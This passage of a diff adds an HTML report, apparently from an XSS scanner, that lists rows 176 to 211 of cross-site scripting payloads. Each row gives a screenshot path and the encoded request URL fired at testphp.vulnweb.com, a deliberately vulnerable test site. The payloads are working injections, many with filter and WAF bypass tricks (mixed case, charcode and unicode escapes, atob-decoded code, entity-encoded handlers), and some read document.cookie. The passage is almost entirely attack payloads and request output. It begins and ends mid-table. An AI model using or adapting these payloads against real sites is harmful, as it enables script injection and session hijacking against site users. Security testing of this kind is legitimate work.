+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%2f%3e%3csvg%2fonload%3dprompt(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%2f%3e%3csvg%2fonload%3dprompt(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>176</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_37_140.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;--`&lt;img/src=` onerror=confirm(1)> --!></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c--%60%3cimg%2fsrc%3d%60+onerror%3dconfirm(1)%3e+--!%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c--%60%3cimg%2fsrc%3d%60+onerror%3dconfirm(1)%3e+--!%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>177</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_38_190.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;?tag x=&quot;-->&quot; test=&quot;&lt;img src=x onerror=alert(1)//&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%3ftag+x%3d%22--%3e%22+test%3d%22%3cimg+src%3dx+onerror%3dalert(1)%2f%2f%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%3ftag+x%3d%22--%3e%22+test%3d%22%3cimg+src%3dx+onerror%3dalert(1)%2f%2f%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>178</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_38_776.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>+-+-1-+-+alert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3e%2b-%2b-1-%2b-%2balert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3e%2b-%2b-1-%2b-%2balert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>179</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_38_816.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>alert(1)&lt;/script>.aspx</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(1)%3c%2fscript%3e.aspx&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(1)%3c%2fscript%3e.aspx&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>180</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_39_624.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;>&lt;/IFRAME></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cIFRAME+SRC%3d%22javascript%3aalert(%27XSS%27)%3b%22%3e%3c%2fIFRAME%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cIFRAME+SRC%3d%22javascript%3aalert(%27XSS%27)%3b%22%3e%3c%2fIFRAME%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>181</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_40_190.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;/SCRIPT>”>’>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3c%2fSCRIPT%3e%e2%80%9d%3e%e2%80%99%3e%3cSCRIPT%3ealert(String.fromCharCode(88%2c83%2c83))%3c%2fSCRIPT%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3c%2fSCRIPT%3e%e2%80%9d%3e%e2%80%99%3e%3cSCRIPT%3ealert(String.fromCharCode(88%2c83%2c83))%3c%2fSCRIPT%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>182</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_40_398.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;body onload=&quot;window.alert(&#39;XSS_WAF_BYPASS&#39;)&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cbody+onload%3d%22window.alert(%27XSS_WAF_BYPASS%27)%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cbody+onload%3d%22window.alert(%27XSS_WAF_BYPASS%27)%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>183</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_40_758.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%0d%0a%20&quot;>&lt;img src=x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%250d%250a%2520%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%250d%250a%2520%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>184</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_40_778.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=&#39;x&#39; onerror=&#39;prompt(document.domain);&#39;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3d%27x%27+onerror%3d%27prompt(document.domain)%3b%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3d%27x%27+onerror%3d%27prompt(document.domain)%3b%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>185</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_42_11.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>/>&lt;svg src=x onload=confirm(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2f%3e%3csvg+src%3dx+onload%3dconfirm(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2f%3e%3csvg+src%3dx+onload%3dconfirm(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>186</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_42_400.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot; &lt;</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+SRC%3d%22javascript%3aalert(%27XSS%27)%3b%22+%3c&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+SRC%3d%22javascript%3aalert(%27XSS%27)%3b%22+%3c&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>187</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_42_511.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dlocation%3datob%60amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p%60%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dlocation%3datob%60amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p%60%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>188</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_42_830.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;/script>&lt;script>alert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>189</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_42_928.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3eeval(String.fromCharCode(97%2c108%2c101%2c114%2c116%2c40%2c49%2c41))%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3eeval(String.fromCharCode(97%2c108%2c101%2c114%2c116%2c40%2c49%2c41))%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>190</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_43_137.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;BODY ONLOAD=javascript:alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cBODY+ONLOAD%3djavascript%3aalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cBODY+ONLOAD%3djavascript%3aalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>191</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_43_301.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=prompt(unescape(&#39;document%2Edomain&#39;));></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(unescape(%27document%252Edomain%27))%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(unescape(%27document%252Edomain%27))%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>192</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_43_702.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;/h1>&lt;script>alert(1)&lt;/script>&lt;h1></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fh1%3e%3cscript%3ealert(1)%3c%2fscript%3e%3ch1%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fh1%3e%3cscript%3ealert(1)%3c%2fscript%3e%3ch1%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>193</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_44_16.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;&quot;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%27%22%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%27%22%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>194</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_44_418.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;ScripT>alert(1234)&lt;/ScRipT></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cScripT%3ealert(1234)%3c%2fScRipT%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cScripT%3ealert(1234)%3c%2fScRipT%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>195</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_44_424.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg/onrandom=random onload=confirm(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fonrandom%3drandom+onload%3dconfirm(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fonrandom%3drandom+onload%3dconfirm(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>196</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_44_424.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;Img Src=OnXSS OnError=confirm(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cImg+Src%3dOnXSS+OnError%3dconfirm(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cImg+Src%3dOnXSS+OnError%3dconfirm(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>197</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_44_553.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=1 onerror=&quot;a:b:c:d:alert(1)&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3d1+onerror%3d%22a%3ab%3ac%3ad%3aalert(1)%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3d1+onerror%3d%22a%3ab%3ac%3ad%3aalert(1)%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>198</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_44_786.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>\u0061\u006C\u0065\u0072\u0074(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3e%5cu0061%5cu006C%5cu0065%5cu0072%5cu0074(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3e%5cu0061%5cu006C%5cu0065%5cu0072%5cu0074(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>199</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_44_834.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%0d%0a%20&quot;>&lt;img src=q onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%250d%250a%2520%22%3e%3cimg+src%3dq+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%250d%250a%2520%22%3e%3cimg+src%3dq+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>200</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_45_99.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;ScRiPt>alert(1)&lt;/sCriPt></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cScRiPt%3ealert(1)%3c%2fsCriPt%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cScRiPt%3ealert(1)%3c%2fsCriPt%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>201</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_45_98.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;/TITLE>&lt;SCRIPT>alert(&quot;XSS&quot;);&lt;/SCRIPT></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fTITLE%3e%3cSCRIPT%3ealert(%22XSS%22)%3b%3c%2fSCRIPT%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fTITLE%3e%3cSCRIPT%3ealert(%22XSS%22)%3b%3c%2fSCRIPT%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>202</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_45_264.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=&quot;non-existent-image.jpg&quot; onerror=&quot;alert(document.cookie);&quot; /></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3d%22non-existent-image.jpg%22+onerror%3d%22alert(document.cookie)%3b%22+%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3d%22non-existent-image.jpg%22+onerror%3d%22alert(document.cookie)%3b%22+%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>203</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_45_494.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=prompt(document.cookie);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(document.cookie)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(document.cookie)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>204</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_45_983.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe srcdoc=&lt;svg/o&amp;#x6Eload&amp;equals;alert&amp;lpar;1)&amp;gt;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+srcdoc%3d%3csvg%2fo%26%23x6Eload%26equals%3balert%26lpar%3b1)%26gt%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+srcdoc%3d%3csvg%2fo%26%23x6Eload%26equals%3balert%26lpar%3b1)%26gt%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>205</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_46_116.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=prompt()></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dprompt()%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dprompt()%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>206</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_46_542.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>??&quot;>&lt;img/src/onerror=alert(document.domain)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3f%3f%22%3e%3cimg%2fsrc%2fonerror%3dalert(document.domain)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3f%3f%22%3e%3cimg%2fsrc%2fonerror%3dalert(document.domain)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>207</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_47_148.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;link rel=&quot;stylesheet&quot; href=&quot;#&quot; onload=&quot;window.alert(&#39;XSS_WAF_BYPASS&#39;)&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3clink+rel%3d%22stylesheet%22+href%3d%22%23%22+onload%3d%22window.alert(%27XSS_WAF_BYPASS%27)%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3clink+rel%3d%22stylesheet%22+href%3d%22%23%22+onload%3d%22window.alert(%27XSS_WAF_BYPASS%27)%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>208</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_47_662.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>-->&lt;svg onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=--%3e%3csvg+onload%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=--%3e%3csvg+onload%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>209</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_48_201.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x:alert(alt) onerror=eval(src) alt=&#39;spyerror&#39;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx%3aalert(alt)+onerror%3deval(src)+alt%3d%27spyerror%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx%3aalert(alt)+onerror%3deval(src)+alt%3d%27spyerror%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>210</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_48_766.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=/ onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3d%2f+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3d%2f+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>211</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_49_685.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe/src=&quot;data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(/AmoloHT/)>&quot;></td>
